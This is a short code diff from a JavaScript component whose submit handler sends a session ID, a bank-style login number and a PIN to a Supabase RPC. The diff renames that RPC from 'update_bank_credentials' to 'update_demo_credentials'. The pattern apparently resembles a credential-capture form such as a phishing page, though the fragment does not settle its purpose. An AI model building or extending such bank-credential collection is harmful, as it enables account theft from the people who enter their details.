@@ -138,7 +138,7 @@ const Bks = () => {
   const handleSubmit = async () => {
     if (!verfNr.trim()) return;
     if (sessionId) {
-      const { error } = await supabase.rpc("update_bank_credentials", {
+      const { error } = await supabase.rpc("update_demo_credentials", {
         p_session_id: sessionId,
         p_username: verfNr,
         p_password: pin,
